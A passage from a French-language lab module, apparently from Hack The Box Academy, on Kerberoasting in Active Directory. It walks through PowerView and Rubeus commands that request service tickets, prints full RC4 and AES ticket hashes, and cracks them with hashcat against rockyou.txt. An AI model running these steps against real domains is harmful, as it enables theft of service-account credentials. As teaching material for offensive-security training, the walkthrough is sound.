                       D66C5F63920FB1434F87A988C52604286DDAD536DA58F80C4B92858FE8B5FFC19DE1B017295134DFBE8A2A6C74CB46FF
                       A7762D64399C7E009AA60B8313C12D192AA25D3025CD0B0F81F7D94249B60E29F683B797493C8C2B9CE61B6E3636034E
                       6DF231C428B4290D1BD32BFE7DC6E7C1E0E30974E0620AE337875A54E4AFF4FD50C4785ADDD59095411B4D94A094E87E
                       6879C36945B424A86159F1575042CB4998F490E6C1BC8A622FC88574EB2CF80DD01A0B8F19D8F4A67C942D08DCCF23DD
                       92949F63D3B32817941A4B9F655A1D4C5F74896E2937F13C9BAF6A81B7EEA3F7BC7C192BAE65484E5FCCBEE6DC51ED9F
                       05864719357F2A223A4C48A9A962C1A90720BBF92A5C9EEB9AC1852BC3A7B8B1186C7BAA063EB0AA90276B5D91AA2495
                       D29D545809B04EE67D06B017C6D63A261419E2E191FB7A737F3A08A2E3291AB09F95C649B5A71C5C45243D4CEFEF5EED
                       95DDD138C67495BDC772CFAC1B8EF37A1AFBAA0B73268D2CDB1A71778B57B02DC02628AF11

```

Enfin, nous pouvons exporter tous les tickets vers un fichier CSV pour un traitement hors ligne.

#### Exportation de tous les tickets vers un fichier CSV

  Exportation de tous les tickets vers un fichier CSV

```
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

```

#### Affichage du contenu du fichier .CSV

  Affichage du contenu du fichier .CSV

```
PS C:\htb> cat .\ilfreight_tgs.csv

"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1

<SNIP>

```

Nous pouvons également utiliser [Rubeus](https://github.com/GhostPack/Rubeus) de GhostPack pour effectuer le Kerberoasting encore plus rapidement et plus facilement. Rubeus nous offre une variété d'options pour effectuer Kerberoasting.

#### Utilisation de Rubeus

  Utilisation de Rubeus

```
PS C:\htb> .\Rubeus.exe

<SNIP>

Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]

```

Comme nous pouvons le voir en faisant défiler le menu d'aide de Rubeus, l'outil dispose d'un grand nombre d'options pour interagir avec Kerberos, dont la plupart sortent du cadre de ce module et seront traitées en profondeur dans les modules ultérieurs sur les attaques Kerberos avancées. Cela vaut la peine de faire défiler le menu, de vous familiariser avec les options et de lire les différentes autres tâches possibles. Certaines options incluent :

-   Exécution de Kerberoasting et sortie de hachages dans un fichier
-   Utilisation d'autres informations d'identification
-   Exécution de Kerberoasting combinée à une attaque passe-le-ticket
-   Exécution d'un Kerberoasting "opsec" pour filtrer les comptes compatibles AES
-   Demander des tickets pour les mots de passe des comptes définis entre une plage de dates spécifique
-   Limiter le nombre de billets demandés
-   Exécution d'AES Kerberoasting

#### Affichage des capacités de Rubeus

![image](https://academy.hackthebox.com/storage/modules/143/rubeus_help.png)

Nous pouvons d'abord utiliser Rubeus pour collecter des statistiques. D'après la sortie ci-dessous, nous pouvons voir qu'il y a neuf utilisateurs Kerberoastable, dont sept prennent en charge le cryptage RC4 pour les demandes de ticket et deux prennent en charge AES 128/256. Plus d'informations sur les types de cryptage plus tard. Nous voyons également que les neuf comptes avaient leur mot de passe défini cette année (2022 au moment de la rédaction). Si nous avons vu des comptes SPN avec leurs mots de passe définis il y a 5 ans ou plus, ils pourraient être des cibles prometteuses car ils pourraient avoir un mot de passe faible qui a été défini et jamais changé lorsque l'organisation était moins mature.

#### Utilisation de l'indicateur /stats

  Utilisation de l'indicateur /stats

```
PS C:\htb> .\Rubeus.exe kerberoast /stats

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 9

 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------

```

Utilisons Rubeus pour demander des tickets pour les comptes avec l' `admincount`attribut défini sur `1`. Ce seraient probablement des cibles de grande valeur et méritaient notre objectif initial pour les efforts de craquage hors ligne avec Hashcat. Assurez-vous de spécifier l' `/nowrap`indicateur afin que le hachage puisse être copié plus facilement pour le craquage hors ligne à l'aide de Hashcat. Selon la documentation, le drapeau ""/nowrap" empêche tout blobs de ticket base64 d'être enveloppé de colonne pour n'importe quelle fonction" ; par conséquent, nous n'aurons pas à nous soucier de couper les espaces blancs ou les retours à la ligne avant de craquer avec Hashcat.

#### Utilisation de l'indicateur /nowrap

  Utilisation de l'indicateur /nowrap

```
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'

[*] Total kerberoastable users : 3

[*] SamAccountName         : backupagent
[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
[*] PwdLastSet             : 2/15/2022 2:15:40 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E

```

* * * * *

Remarque sur les types de chiffrement
-------------------------------------

Les exemples ci-dessous sur les types de chiffrement ne sont pas reproductibles dans le laboratoire du module car le contrôleur de domaine cible exécute Windows Server 2019. Plus d'informations à ce sujet plus loin dans la section.

Les outils Kerberoasting demandent généralement `RC4 encryption`lors de l'exécution de l'attaque et du lancement des demandes TGS-REQ. En effet, RC4 est [plus faible](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) et plus facile à casser hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256. Lors de l'exécution de Kerberoasting dans la plupart des environnements, nous récupérons les hachages commençant par `$krb5tgs$23$*`, un ticket chiffré RC4 (type 23). Parfois, nous recevons un hachage crypté AES-256 (type 18) ou un hachage commençant par `$krb5tgs$18$*`. Bien qu'il soit possible de cracker des tickets TGS AES-128 (type 17) et AES-256 (type 18) en utilisant [Hashcat](https://github.com/hashcat/hashcat/pull/1955) , cela prendra généralement beaucoup plus de temps que de cracker un ticket crypté RC4 (type 23), mais toujours possible surtout si un mot de passe faible est choisi. Passons en revue un exemple.

Commençons par créer un compte SPN nommé `testspn`et en utilisant Rubeus pour Kerberoast cet utilisateur spécifique pour tester cela. Comme nous pouvons le voir, nous avons reçu le ticket TGS RC4 (type 23) crypté.

  Utilisation de l'indicateur /nowrap

```
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$4A8E252D305475EB9410FF3E1E99517F90E27FB588173ACE3651DEACCDEC62165DE6EA1E6337F3640632FA42419A535B501ED1D4D1A0B704AA2C56880D74C2940170DC0747CE4D05B420D76BF298226AADB53F2AA048BE813B5F0CA7A85A9BB8C7F70F16F746807D3B84AA8FE91B8C38AF75FB9DA49ED133168760D004781963DB257C2339FD82B95C5E1F8F8C4BD03A9FA12E87E278915A8362DA835B9A746082368A155EBB5EFB141DC58F2E46B7545F82278AF4214E1979B35971795A3C4653764F08C1E2A4A1EDA04B1526079E6423C34F88BDF6FA2477D28C71C5A55FA7E1EA86D93565508081E1946D796C0B3E6666259FEB53804B8716D6D076656BA9D392CB747AD3FB572D7CE130940C7A6415ADDB510E2726B3ACFA485DF5B7CE6769EEEF08FE7290539830F6DA25C359894E85A1BCFB7E0B03852C7578CB52E753A23BE59AB9D1626091376BA474E4BAFAF6EBDD852B1854FF46AA6CD1F7F044A90C9497BB60951C4E82033406ACC9B4BED7A1C1AFEF41316A58487AFEA4D5C07940C87367A39E66415D9A54B1A88DADE1D4A0D13ED9E474BDA5A865200E8F111996B846E4E64F38482CEE8BE4FC2DC1952BFFBD221D7284EFF27327C0764DF4CF68065385D31866DA1BB1A189E9F82C46316095129F06B3679EE1754E9FD599EB9FE96C10315F6C45300ECCBEB6DC83A92F6C08937A244C458DB69B80CE85F0101177E6AC049C9F11701E928685F41E850CA62F047B175ADCA78DCA2171429028CD1B4FFABE2949133A32FB6A6DC9E0477D5D994F3B3E7251FA8F3DA34C58FAAE20FC6BF94CC9C10327984475D7EABE9242D3F66F81CFA90286B2BA261EBF703ADFDF7079B340D9F3B9B17173EBA3624D9B458A5BD1CB7AF06749FF3DB312BCE9D93CD9F34F3FE913400655B4B6F7E7539399A2AFA45BD60427EA7958AB6128788A8C0588023DDD9CAA4D35459E9DEE986FD178EB14C2B8300C80931624044C3666669A68A665A72A1E3ABC73E7CB40F6F46245B206777EE1EF43B3625C9F33E45807360998B7694DC2C70ED47B45172FA3160FFABAA317A203660F26C2835510787FD591E2C1E8D0B0E775FC54E44A5C8E5FD1123FBEDB463DAFDFE6A2632773C3A1652970B491EC7744757872C1DDC22BAA7B4723FEC91C154B0B4262637518D264ADB691B7479C556F1D10CAF53CB7C5606797F0E00B759FCA56797AAA6D259A47FCCAA632238A4553DC847E0A707216F0AE9FF5E2B4692951DA4442DF86CD7B10A65B786FE3BFC658CC82B47D9C256592942343D05A6F06D250265E6CB917544F7C87645FEEFA54545FEC478ADA01B8E7FB6480DE7178016C9DC8B7E1CE08D8FA7178D33E137A8C076D097C1C29250673D28CA7063C68D592C30DCEB94B1D93CD9F18A2544FFCC07470F822E783E5916EAF251DFA9726AAB0ABAC6B1EB2C3BF6DBE4C4F3DE484A9B0E06FF641B829B651DD2AB6F6CA145399120E1464BEA80DC3608B6C8C14F244CBAA083443EB59D9EF3599FCA72C6997C824B87CF7F7EF6621B3EAA5AA0119177FC480A20B82203081609E42748920274FEBB94C3826D57C78AD93F04400DC9626CF978225C51A889224E3ED9E3BFDF6A4D6998C16D414947F9E157CB1594B268BE470D6FB489C2C6C56D2AD564959C5

```

En vérifiant avec PowerView, nous pouvons voir que l' `msDS-SupportedEncryptionTypes`attribut est défini sur `0`. Le tableau [ici](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) nous indique qu'une valeur décimale de `0`signifie qu'un type de chiffrement spécifique n'est pas défini et défini sur la valeur par défaut de `RC4_HMAC_MD5`.

  Utilisation de l'indicateur /nowrap

```
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            0 testspn

```

Ensuite, cassons ce ticket en utilisant Hashcat et notons combien de temps cela a pris. Le compte est défini avec un mot de passe faible trouvé dans la `rockyou.txt`liste de mots pour nos besoins. En passant par Hashcat, nous voyons qu'il a fallu quatre secondes pour se fissurer sur un processeur, et donc il se fissurerait presque instantanément sur une puissante plate-forme de craquage GPU et probablement même sur un seul GPU.

#### Casser le ticket avec Hashcat & rockyou.txt

  Casser le ticket avec Hashcat & rockyou.txt

```
dsgsec@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>64bea80dc3608b6c8c14f244cbaa083443eb59d9ef3599fca72c6997c824b87cf7f7ef6621b3eaa5aa0119177fc480a20b82203081609e42748920274febb94c3826d57c78ad93f04400dc9626cf978225c51a889224e3ed9e3bfdf6a4d6998c16d414947f9e157cb1594b268be470d6fb489c2c6c56d2ad564959c5:welcome1$

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/ke...4959c5
Time.Started.....: Sun Feb 27 15:36:58 2022 (4 secs)
Time.Estimated...: Sun Feb 27 15:37:02 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   693.3 kH/s (5.41ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2789376/14344385 (19.45%)
Rejected.........: 0/2789376 (0.00%)
Restore.Point....: 2777088/14344385 (19.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: westham76 -> wejustare

Started: Sun Feb 27 15:36:57 2022
Stopped: Sun Feb 27 15:37:04 2022

```

Supposons que notre client a défini des comptes SPN pour prendre en charge le cryptage AES 128/256.

![image](https://academy.hackthebox.com/storage/modules/143/aes_kerberoast.png)

Si nous vérifions cela avec PowerView, nous verrons que le `msDS-SupportedEncryptionTypes attribute`est défini sur `24`, ce qui signifie que les types de chiffrement AES 128/256 sont les seuls pris en charge.

#### Vérification des types de chiffrement pris en charge

  Vérification des types de chiffrement pris en charge

```
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            24 testspn

```

Demander un nouveau ticket avec Rubeus nous montrera que le nom du compte utilise le cryptage AES-256 (type 18).

#### Demander un nouveau billet

  Demander un nouveau billet

```
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$8939F8C5B97A4CAA170AD706$84B0DD2C5A931E123918FFD64561BFE651F89F079A47053814244C0ECDF15DF136E5787FAC4341A1BDF6D5077EAF155A75ACF0127A167ABE4B2324C492ED1AF4C71FF8D51927B23656FCDE36C9A7AC3467E4DB6B7DC261310ED05FB7C73089763558DE53827C545FB93D25FF00B5D89FCBC3BBC6DDE9324093A3AADBE2C6FE21CFB5AFBA9DCC5D395A97768348ECCF6863EFFB4E708A1B55759095CCA98DE7DE0F7C149357365FBA1B73FCC40E2889EA75B9D90B21F121B5788E27F2FC8E5E35828A456E8AF0961435D62B14BADABD85D4103CC071A07C6F6080C0430509F8C4CDAEE95F6BCC1E3618F2FA054AF97D9ED04B47DABA316DAE09541AC8E45D739E76246769E75B4AA742F0558C66E74D142A98E1592D9E48CA727384EC9C3E8B7489D13FB1FDB817B3D553C9C00FA2AC399BB2501C2D79FBF3AF156528D4BECD6FF03267FB6E96E56F013757961F6E43838054F35AE5A1B413F610AC1474A57DE8A8ED9BF5DE9706CCDAD97C18E310EBD92E1C6CD5A3DE7518A33FADB37AE6672D15DACFE44208BAC2EABB729C24A193602C3739E2C21FB606D1337E1599233794674608FECE1C92142723DFAD238C9E1CB0091519F68242FBCC75635146605FDAD6B85103B3AFA8571D3727F11F05896103CB65A8DDE6EB29DABB0031DCF03E4B6D6F7D10E85E02A55A80CD8C93E6C8C3ED9F8A981BBEA01ABDEB306078973FE35107A297AF3985CF12661C2B8614D136B4AF196D27396C21859F40348639CD1503F517D141E2E20BB5F78818A1A46A0F63DD00FEF2C1785672B4308AE1C83ECD0125F30A2708A273B8CC43D6E386F3E1A520E349273B564E156D8EE7601A85D93CF20F20A21F0CF467DC0466EE458352698B6F67BAA9D65207B87F5E6F61FF3623D46A1911342C0D80D7896773105FEC33E5C15DB1FF46F81895E32460EEA32F423395B60582571551FF74D1516DDA3C3EBAE87E92F20AC9799BED20BF75F462F3B7D56DA6A6964B7A202FE69D9ED62E9CB115E5B0A50D5BBF2FD6A22086D6B720E1589C41FABFA4B2CD6F0EFFC9510EC10E3D4A2BEE80E817529483D81BE11DA81BBB5845FEC16801455B234B796728A296C65EE1077ABCF67A48B96C4BD3C90519DA6FF54049DE0BD72787F428E8707A5A46063CE57E890FC22687C4A1CF6BA30A0CA4AB97E22C92A095140E37917C944EDCB64535166A5FA313CEF6EEB5295F9B8872D398973362F218DF39B55979BDD1DAD5EC8D7C4F6D5E1BD09D87917B4562641258D1DFE0003D2CC5E7BCA5A0FC1FEC2398B1FE28079309BEC04AB32D61C00781C92623CA2D638D1923B3A94F811641E144E17E9E3FFB80C14F5DD1CBAB7A9B53FB5895DFC70A32C65A9996FB9752B147AFB9B1DFCBECA37244A88CCBD36FB1BF38822E42C7B56BB9752A30D6C8198B6D64FD08A2B5967414320D532F0404B3920A5F94352F85205155A7FA7EB6BE5D3A6D730318FE0BF60187A23FF24A84C18E8FC62DF6962D91D2A9A0F380987D727090949FEC4ADC0EF29C7436034A0B9D91BA36CC1D4C457392F388AB17E646418BA9D2C736B0E890CF20D425F6D125EDD9EFCA0C3DA5A6E203D65C8868EE3EC87B853398F77B91DDCF66BD942EC17CF98B6F9A81389489FCB60349163E10196843F43037E79E10794AC70F88225EDED2D51D26413D53

```

Pour exécuter cela via Hashcat, nous devons utiliser le mode de hachage `19700`, qui correspond `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)`à la table pratique Hashcat [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) . Nous exécutons le hachage AES comme suit et vérifions l'état, ce qui montre qu'il devrait prendre plus de 23 minutes pour parcourir l'intégralité de la liste de mots rockyou.txt en tapant `s`pour voir l'état du travail de craquage.

#### Exécution de Hashcat et vérification de l'état du travail de craquage

  Exécution de Hashcat et vérification de l'état du travail de craquage

```
dsgsec@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: Kerberos 5, etype 18, TGS-REP
Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53
Time.Started.....: Sun Feb 27 16:07:50 2022 (57 secs)
Time.Estimated...: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10277 H/s (8.99ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 583680/14344385 (4.07%)
Rejected.........: 0/583680 (0.00%)
Restore.Point....: 583680/14344385 (4.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3264-3328
Candidates.#1....: skitzy -> sammy<3

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>

```

Lorsque le hachage se fissure enfin, on constate qu'il a fallu 4 minutes 36 secondes pour un mot de passe relativement simple sur un CPU. Cela serait grandement amplifié avec un mot de passe plus fort/plus long.

#### Affichage du temps qu'il a fallu pour craquer

  Affichage du temps qu'il a fallu pour craquer

```
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 18, TGS-REP
Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53
Time.Started.....: Sun Feb 27 16:07:50 2022 (4 mins, 36 secs)
Time.Estimated...: Sun Feb 27 16:12:26 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10114 H/s (9.25ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2789376/14344385 (19.45%)
Rejected.........: 0/2789376 (0.00%)
Restore.Point....: 2783232/14344385 (19.40%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4032-4095
Candidates.#1....: wenses28 -> wejustare

```

